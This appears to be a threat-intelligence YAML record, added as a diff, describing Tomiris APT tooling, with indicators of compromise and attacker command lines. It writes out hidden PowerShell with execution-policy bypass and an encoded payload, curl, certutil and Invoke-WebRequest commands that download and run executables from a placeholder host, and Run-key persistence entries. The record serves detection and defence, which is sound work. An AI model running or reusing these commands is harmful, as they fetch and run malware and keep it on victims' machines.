@@ -1,0 +1,81 @@
+description: "Tomiris APT group deployed a multi\u2011stage downloader and command\
+  \ & control infrastructure using PowerShell, cmd.exe, and custom scripts."
+attribution: Tomiris APT group, Russia
+malware_families:
+- Tomiris
+- AdaptixC2
+- Havoc
+- Backdoor.Win64.RShell.gen
+- Backdoor.MSIL.RShell.gen
+- Backdoor.Win64.Telebot.gen
+- Backdoor.Python.Telebot.gen
+- Trojan.Win32.RProxy.gen
+- Trojan.Win32.TJLORT.a
+- Backdoor.Win64.AdaptixC2.a
+TTPs:
+  processes: []
+  commandline:
+  - powershell.exe -ep Bypass -w hidden -File %temp%\script.ps1
+  - cmd.exe /c curl -o $public\videos\offel.exe http://<HOST>/offel.exe
+  - cmd.exe /c dir
+  - cmd.exe /c dir C:\user\[username]\pictures
+  - cmd.exe /c pwd
+  - cmd.exe /c curl -O $public\sysmgmt.exe http://<HOST>/private/svchost.exe
+  - cmd.exe /c $public\sysmgmt.exe
+  - powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGgAYQB0AF8AaQBkACAAPQAgACIANwA3ADAAOQAyADIAOAAyADgANQ...
+  powershell:
+  - Invoke-WebRequest -Uri https://<HOST>/winupdate.exe -OutFile $public\pictures\sbschost.exe
+  - Invoke-WebRequest -Uri https://<HOST>/service.exe -OutFile $public\libraries\service.exe
+  - certutil -urlcache -f https://<HOST>/AkelPad.rar $public\libraries\AkelPad.rar
+  - powershell -ep Bypass -w hidden -EncodedCommand JABjAGgAYQB0AF8AaQBkACAAPQAgACIANwA3ADAAOQAyADIAOAAyADgANQ...
+  scripting_engine:
+  - script.vbs
+  - script.ps1
+  - script.vbsc
+  - script.ps1%TEMP%\rfolder<PC_NAME>script.ps1
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity:
+  - '%temp%\1.zip'
+  - '%env:Temp%\rfolder'
+  - $public\pictures\sbschost.exe
+  - $public\libraries\service.exe
+  - $public\libraries\AkelPad.rar
+  - $public\videos\offel.exe
+  - $public\sysmgmt.exe
+  persistence:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdate /t REG_SZ
+    /d $public\\pictures\\winupdate.exe /f
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Win-NetAlone" /t REG_SZ
+    /d "$public\\videos\\alone.exe"
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Winservice /t REG_SZ
+    /d "$public\\Pictures\\dwm.exe"
+  process_relations: []
+IOCs:
+  hashes: []
+  ips: []
+  domains:
+  - docsino.ru
+  - sss.qwadx.com
+  urls:
+  - hxxp://193.149.129.113/<PC_NAME>
+  - hxxps://api.telegram.org/bot7804558453:AAFR2OjF7ktvyfygleIneu_8WDaaSkduV7k/
+  - https://<HOST>/winupdate.exe
+  - http://<HOST>/service.exe
+  - https://<HOST>/AkelPad.rar
+  ip_addresses:
+  - 193.149.129.113
+  - 195.2.79.245
+  - 62.113.115.89
+  - 82.115.223.78
+  - 85.209.128.171
+  - 88.214.25.249
+  - 89.110.95.151
+  - 89.110.98.234
+authors:
+- Oleg Kupreev
+- Artem Ushkov
+reference: https://securelist.com/tomiris-new-tools/118143
+date_of_publication: November 28, 2025
+file_creation_date: November 29, 2025
